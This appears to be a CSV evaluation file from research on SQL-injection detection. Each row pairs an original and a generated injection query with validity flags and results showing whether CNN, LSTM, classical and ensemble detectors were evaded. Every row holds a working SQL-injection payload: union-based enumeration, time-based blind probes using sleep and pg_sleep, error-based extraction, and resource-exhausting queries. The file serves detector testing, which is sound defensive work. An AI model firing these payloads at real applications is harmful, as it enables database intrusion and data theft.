,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
7305,"-9634'   )    )     )   union all select 4141,4141#","-9634'   )    )     )   union all select 4141,4141#",1,1,0,0,0,0,0
7306,"-5640""   )    )    or 9792  =  2728--","-5640""   )    )    or 9792  =  2728--",1,1,0,0,0,0,0
7307,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac","1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",1,1,0,0,0,0,0
7308,-5764 or 3038  =  3038,-5764 or 3038  =  3038,0,1,0,0,0,0,0
7309,select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,1,1,0,0,0,0,0
7310,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx","select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx",1,1,0,0,0,0,0
7311,1 union all select null--,1 union all select null--,1,1,0,0,0,0,0
7312,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  ""","select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,1,1,0,0,0,0,0
7313,1' where 8159  =  8159 union all select null#,1' where 8159  =  8159 union all select null#,1,1,0,0,0,0,0
7314,"1""  )   as uuth where 8555  =  8555 union all select null,null#","1""  )   as uuth where 8555  =  8555 union all select null,null#",1,1,0,0,0,0,0
7315,"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ","-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1,0,0,0,0,0
7316,"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--","select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",0,1,0,0,0,0,0
7317,"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --","call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",0,1,0,0,0,0,0
7318,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',1,1,0,0,0,0,0
7319,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,1,1,0,0,0,0,0
7320,select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,1,1,0,0,0,0,0
7321,"-9861' union all select 5710,5710,5710,5710,5710--","-9861' union all select 5710,5710,5710,5710,5710--",1,1,0,0,0,0,0
7322,"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#","1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
7323,"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,0,0,0,0,0
7324,"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,0,0,0,0,0
7325,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382","1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",1,1,0,0,0,0,0
7326,1  )   as selm where 5759  =  5759,1  )   as selm where 5759  =  5759,0,1,0,0,0,0,0
7327,"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--","-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",1,1,0,0,0,0,0
7328,-8369  )   where 7234  =  7234 order by 1--,-8369  )   where 7234  =  7234 order by 1--,0,1,0,0,0,0,0
7329,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ","1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,1,0,0,0,0,0
7330,"1""   )    )     )   union all select null,null#","1""   )    )     )   union all select null,null#",1,1,0,0,0,0,0
7331,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997","1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",0,1,0,0,0,0,0
7332,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  ""","select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,0,1,0,0,0,0,0
7333,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',1,1,0,0,0,0,0
7334,"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""fcpm""  =  ""fcpm","1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""fcpm""  =  ""fcpm",1,1,0,0,0,0,0
7335,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,0,0,0,0,0
7336,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,1,1,0,0,0,0,0
7337,select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,0,1,0,0,0,0,0
7338,"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --","1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,0,0,0,0,0
7339,"-1055' union all select 7758,7758,7758,7758,7758,7758--","-1055' union all select 7758,7758,7758,7758,7758,7758--",1,1,0,0,0,0,0
7340,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#","-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1,1,0,0,0,0,0
7341,"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#","1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
7342,1' where 8635  =  8635 order by 1--,1' where 8635  =  8635 order by 1--,1,1,0,0,0,0,0
7343,-8447 where 2850  =  2850 or 7147  =  3262,-8447 where 2850  =  2850 or 7147  =  3262,0,1,0,0,0,0,0
7344,"1 and elt  (  4249  =  4249,7259  )  ","1 and elt  (  4249  =  4249,7259  )  ",0,1,0,0,0,0,0
7345,"1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,0,0,0,0,0
7346,"1"" where 6179  =  6179","1"" where 6179  =  6179",1,1,0,0,0,0,0
7347,1'  )   where 6842  =  6842,1'  )   where 6842  =  6842,1,1,0,0,0,0,0
7348,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --","1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,0,0,0,0,0
7349,-3937   )    )    or 3038  =  3038,-3937   )    )    or 3038  =  3038,0,1,0,0,0,0,0
7350,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '","1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",1,1,0,0,0,0,0
7351,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1,1,0,0,0,0,0
7352,1'  )   as cdrm where 4595  =  4595 order by 1#,1'  )   as cdrm where 4595  =  4595 order by 1#,1,1,0,0,0,0,0
7353,"1""   )    )    as zbfj where 2285  =  2285","1""   )    )    as zbfj where 2285  =  2285",1,1,0,0,0,0,0
7354,"1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0,0,0,0,0
7355,1 and 4595  =  4595#,1 and 4595  =  4595#,0,1,0,0,0,0,0
7356,-9429'  )   order by 1--,-9429'  )   order by 1--,1,1,0,0,0,0,0
7357,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1,1,0,0,0,0,0
7358,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz","1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",1,1,0,0,0,0,0
7359,select   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  select 5152 from mysql.db  )   end  )  #,select   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  select 5152 from mysql.db  )   end  )  #,0,1,0,0,0,0,0
7360,"1%"" union all select null,null,null,null,null,null#","1%"" union all select null,null,null,null,null,null#",1,1,0,0,0,0,0
7361,"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0,0,0,0,0
7362,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy","1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",1,1,0,0,0,0,0
7363,"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #","1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,0,0,0,0,0
7364,"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --","1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",0,1,0,0,0,0,0
7365,"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq","-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",1,1,0,0,0,0,0
7366,1 or sleep  (  5  )  #,1 or sleep  (  5  )  #,0,1,0,0,0,0,0
7367,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm","1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",1,1,0,0,0,0,0
7368,"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,1,0,0,0,0,0
7369,"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ","1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ",1,1,0,0,0,0,0
7370,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,1,1,0,0,0,0,0
7371,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs","1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",1,1,0,0,0,0,0
7372,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq","-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",1,1,0,0,0,0,0
7373,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw","select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",0,1,0,0,0,0,0
7374,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0,0,0,0,0
7375,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#","-2287'   )    )    union all select 1200,1200,1200,1200,1200#",1,1,0,0,0,0,0
7376,"-6184""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""rovr""  =  ""rovr","-6184""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""rovr""  =  ""rovr",1,1,0,0,0,0,0
7377,select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,0,1,0,0,0,0,0
7378,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1,1,0,0,0,0,0
7379,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb","1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",1,1,0,0,0,0,0
7380,"1%'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  '%'  =  '","1%'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  '%'  =  '",1,1,0,0,0,0,0
7381,"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb","1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb",1,1,0,0,0,0,0
7382,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#","-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",1,1,0,0,0,0,0
7383,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht","1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",1,1,0,0,0,0,0
7384,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--","-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1,1,0,0,0,0,0
7385,"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #","1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1,1,0,0,0,0,0
7386,1   )    )    union all select null#,1   )    )    union all select null#,1,1,0,0,0,0,0
7387,"-4955%' union all select 5928,5928--","-4955%' union all select 5928,5928--",1,1,0,0,0,0,0
7388,"1' and elt  (  2266  =  7467,7467  )  ","1' and elt  (  2266  =  7467,7467  )  ",1,1,0,0,0,0,0
7389,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,1,1,0,0,0,0,0
7390,"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ","1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1,1,0,0,0,0,0
7391,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs","1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",1,1,0,0,0,0,0
7392,-4901  )   or 3407  =  6442#,-4901  )   or 3407  =  6442#,0,1,0,0,0,0,0
7393,1' where 4134  =  4134 and 1102  =  6300--,1' where 4134  =  4134 and 1102  =  6300--,1,1,0,0,0,0,0
7394,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf","1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf",1,1,0,0,0,0,0
7395,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq","-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",1,1,0,0,0,0,0
7396, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +', (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',1,1,0,0,0,0,0
7397,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1,0,0,0,0,0
7398,"-3604'  )   as fyev where 7259  =  7259 union all select 7259,7259,7259,7259--","-3604'  )   as fyev where 7259  =  7259 union all select 7259,7259,7259,7259--",1,1,0,0,0,0,0
7399,-6433%'   )    )    or 9323  =  9323#,-6433%'   )    )    or 9323  =  9323#,1,1,0,0,0,0,0
7400,-8836%'  )   or 4856  =  3891,-8836%'  )   or 4856  =  3891,1,1,0,0,0,0,0
7401,"1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --","1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,0,0,0,0,0
7402,"1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  '","1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  '",1,1,0,0,0,0,0
7403, (  7098  =  7098 and sleep  (  5   )    ) , (  7098  =  7098 and sleep  (  5   )    ) ,0,1,0,0,0,0,0
7404,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#","1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",1,1,0,0,0,0,0
7405,-3243 or 2266  =  3583#,-3243 or 2266  =  3583#,0,1,0,0,0,0,0
7406,"1'  )   union all select null,null,null,null,null--","1'  )   union all select null,null,null,null,null--",1,1,0,0,0,0,0
7407,"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  ""","1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1,1,0,0,0,0,0
7408,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf","1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",1,1,0,0,0,0,0
7409,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct","1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct",1,1,0,0,0,0,0
7410,-9120'   )    )    or 8571  =  8571--,-9120'   )    )    or 8571  =  8571--,1,1,0,0,0,0,0
7411,1'+  (  select naiw where 4924  =  4924,1'+  (  select naiw where 4924  =  4924,1,1,0,0,0,0,0
7412,-9389'  )   or 8859  =  3989--,-9389'  )   or 8859  =  3989--,1,1,0,0,0,0,0
7413,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#","-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",1,1,0,0,0,0,0
